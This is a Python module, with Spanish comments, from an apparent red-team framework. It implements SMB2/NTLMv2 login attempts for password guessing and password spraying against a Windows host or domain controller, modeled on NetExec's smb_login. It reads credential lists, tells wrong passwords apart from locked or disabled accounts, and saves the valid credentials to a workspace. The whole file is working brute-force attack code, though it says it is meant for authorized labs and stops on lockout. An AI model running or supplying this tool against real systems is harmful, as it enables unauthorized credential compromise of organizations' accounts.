# -*- coding: utf-8 -*-
"""
Módulo ad/smb_login
===================
Valida pares usuario:contraseña contra SMB2 con autenticación NTLMv2
propia (NTLMSSP type 1/2/3 puro en Python, core.smb_min). Es el equivalente
al módulo `smb_login` de NetExec / CrackMapExec: distingue contraseña
incorrecta de cuenta bloqueada/deshabilitada/otros estados, y registra las
credenciales válidas en el workspace para el resto de la operación.

MUY ruidoso: cada intento genera evento 4625 en el host objetivo.
Para laboratorios autorizados exclusivamente.

Riesgo: ALTO (fuerza bruta de credenciales sobre el dominio).
ATT&CK: T1110.001/T1110.003 (Password Guessing / Password Spraying).
"""

from core import smb_min
from core.base_module import BaseModulo, ModuloError
from modules.ad.kerberos_userenum import cargar_lista


class SmbLogin(BaseModulo):
    """Prueba credenciales contra SMB2/NTLMv2 y guarda las válidas."""

    NAME = "ad/smb_login"
    CATEGORIA = "ad"
    DESCRIPCION = ("Valida pares usuario:contraseña contra SMB2 con NTLMv2 "
                   "propio (sin libs). Distingue clave mala, cuenta bloqueada "
                   "o deshabilitada. Registro de válidas en el workspace.")
    RIESGO = "alto"
    AUTOR = "REDHAVOC"
    REFERENCIA = "NetExec (smb_login) · MITRE ATT&CK T1110"
    ATTCK = ("T1110.001", "T1110.003")

    def definir_opciones(self) -> None:
        self.opciones.declarar("RHOST", "", True, "IP o nombre del host / controlador")
        self.opciones.declarar("CREDENCIALES", "", True,
                               "usuario:contraseña separadas por comas, o fichero @ruta "
                               "(una por línea). DOMINIO separa el prefijo si lo hay")
        self.opciones.declarar("DOMINIO", "", False, "Dominio NetBIOS (p. ej. CORP) si las "
                                                      "credenciales no lo traen")
        self.opciones.declarar("PUERTO", "445", False, "Puerto SMB")

    # ------------------------------------------------------------------
    def ejecutar(self) -> dict:
        host = self._objetivo_host(self.opt("RHOST"))
        puerto = self.opt_int("PUERTO", 445) or 445
        dominio = self.opt("DOMINIO").strip()
        pares = self._pares(self.opt("CREDENCIALES"))
        if not pares:
            raise ModuloError("Lista de credenciales vacía")

        validas, estados = [], []
        cliente = smb_min.ClienteSMB(host, puerto=puerto,
                                     timeout=self.opt_int("TIMEOUT", 5) or 5)
        try:
            for usuario, contrasena, dominio_par in pares:
                dom = dominio_par or dominio
                try:
                    estado = cliente.iniciar_sesion(usuario, contrasena, dom)
                except smb_min.ModuloError:
                    raise
                except OSError as err:
                    raise ModuloError(f"Red caída durante el login: {err}")
                etiqueta = smb_min.ESTADOS_NT.get(estado, f"0x{estado:08X}")
                estados.append({"usuario": usuario, "dominio": dom,
                                "estado": estado, "estado_texto": etiqueta})
                if estado == smb_min.NT_SUCCESS:
                    validas.append({"usuario": usuario, "dominio": dom,
                                    "contrasena": contrasena})
                    self.ctx.workspace.add_cred(host, f"{dom}\\{usuario}",
                                                contrasena, "SMB")
                    self.ctx.workspace.add_host(host, notas="SMB NTLMv2")
                    self.ctx.workspace.add_service(host, puerto, "SMB")
                elif estado == smb_min.NT_ACCOUNT_LOCKED:
                    break   # lockout: parar de inmediato, no empeorar
        finally:
            cliente.cerrar()

        resumen = (f"{host}: {len(validas)}/{len(pares)} credenciales SMB válidas"
                   + (" · SE DETUVO POR LOCKOUT" if estados
                      and estados[-1]["estado"] == smb_min.NT_ACCOUNT_LOCKED else ""))
        return {
            "resumen": resumen,
            "host": host,
            "dialecto": cliente.dialecto,
            "probadas": len(pares),
            "validas": validas,
            "estados": estados,
        }

    # ------------------------------------------------------------------
    @staticmethod
    def _pares(cadena: str) -> list:
        """Convierte 'dom\\user:pass, user2:pass2' o fichero @ruta en
        [(usuario, contraseña, dominio), ...].

        A diferencia de cargar_lista, NO parte por espacios: las
        contraseñas pueden contenerlos. Separadores: coma y salto de línea.
        """
        texto = (cadena or "").strip()
        if texto.startswith("@"):
            try:
                contenido = open(texto[1:], encoding="utf-8").read()
            except OSError as err:
                raise ModuloError(f"No se pudo leer la lista {texto[1:]}: {err}")
        else:
            contenido = texto
        pares = []
        for trozo in contenido.replace("\r\n", "\n").replace("\n", ",").split(","):
            trozo = trozo.strip()
            if ":" not in trozo:
                continue
            cred, contrasena = trozo.split(":", 1)
            dominio = ""
            if "\\" in cred:
                dominio, cred = cred.split("\\", 1)
            pares.append((cred, contrasena, dominio))
        return pares
